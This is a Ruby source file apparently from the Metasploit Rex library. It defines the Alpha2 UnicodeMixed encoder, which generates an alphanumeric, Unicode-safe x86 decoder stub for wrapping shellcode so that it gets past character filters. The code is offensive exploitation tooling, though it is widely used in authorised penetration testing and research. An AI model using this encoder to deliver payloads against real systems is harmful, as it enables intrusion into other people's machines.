#!/usr/bin/env ruby

require 'rex/encoder/alpha2/generic'

module Rex
module Encoder
module Alpha2

class UnicodeMixed < Generic

	def self.gen_base(max)
		max = max / 0x10
		(rand(max) * 0x10)
	end

	def self.gen_second(block, base)
		# unicode uses additive encoding
		(block - base)
	end
    
	def self.gen_decoder_prefix(reg, offset)
		if (offset > 14)
			 raise "Critical: Offset is greater than 14"
		end

		# offset untested for unicode :(
		nop = 'CP' * offset
		dec = 'IA' * (14 - offset) + nop    # dec ecx,,, push ecx, pop edx

		regprefix = {                       # nops ignored below
			'EAX'   => 'PPYA' + dec,         # push eax, pop ecx
			'ECX'   =>  dec + "4444",        # dec ecx
			'EDX'   => 'RRYA' + dec,         # push edx, pop ecx
			'EBX'   => 'SSYA' + dec,         # push ebx, pop ecx
			'ESP'   => 'TUYA' + dec,         # push esp, pop ecx
			'EBP'   => 'UUYA' + dec,         # push ebp, pop ecx
			'ESI'   => 'VVYA' + dec,         # push esi, pop ecx
			'EDI'   => 'WWYA' + dec,         # push edi, pop edi
		}

		return regprefix[reg]	
	end

	def self.gen_decoder(reg, offset)
		decoder =
			gen_decoder_prefix(reg, offset) +
			"j" +               # push 0
			"XA" +              # pop eax, NOP
			"QA" +              # push ecx, NOP
			"DA" +              # inc esp, NOP
			"ZA" +              # pop edx, NOP
			"BA" +              # inc edx, NOP
			"RA" +              # push edx, NOP
			"LA" +              # dec esp, NOP
			"YA" +              # pop ecx, NOP
			"IA" +              # dec ecx, NOP
			"QA" +              # push ecx, NOP
			"IA" +              # dec ecx, NOP
			"QA" +              # push ecx, NOP
			"IA" +              # dec ecx, NOP
			"hAAA" +            # push 00410041, NOP
			"Z" +               # pop edx
			"1A" +              # add [ecx], dh NOP
			"IA" +              # dec ecx, NOP
			"IA" +              # dec ecx, NOP
			"J" +               # dec edx
			"1" +               # add [ecx], dh
			"1A" +              # add [ecx], dh NOP
			"IA" +              # dec ecx, NOP
			"IA" +              # dec ecx, NOP
			"BA" +              # inc edx, NOP
			"BA" +              # inc edx, NOP
			"B" +               # inc edx
			"Q" +               # add [ecx], dl
			"I" +               # dec ecx
			"1A" +              # add [ecx], dh NOP
			"I" +               # dec ecx
			"Q" +               # add [ecx], dl
			"IA" +              # dec ecx, NOP
			"I" +               # dec ecx
			"Q" +               # add [ecx], dh
			"I" +               # dec ecx
			"1" +               # add [ecx], dh
			"1" +               # add [ecx], dh
			"1A" +              # add [ecx], dh NOP
			"IA" +              # dec ecx, NOP
			"J" +               # dec edx
			"Q" +               # add [ecx], dl 
			"YA" +              # pop ecx, NOP
			"Z" +               # pop edx
			"B" +               # add [edx], al
			"A" +               # inc ecx       <-------
			"B" +               # add [edx], al         |
			"A" +               # inc ecx               |
			"B" +               # add [edx], al         |
			"A" +               # inc ecx               |
			"B" +               # add [edx], al         |
			"A" +               # inc ecx               |
			"B" +               # add [edx], al         |
			"kM" +              # imul eax, [eax], 10 * |
			"A" +               # add [edx], al         |
			"G" +               # inc edi               | 
			"B" +               # add [edx], al         |
			"9" +               # cmp [eax], eax        |
			"u" +               # jnz ------------------      
			"4JB"

		return decoder
	end

end end end end
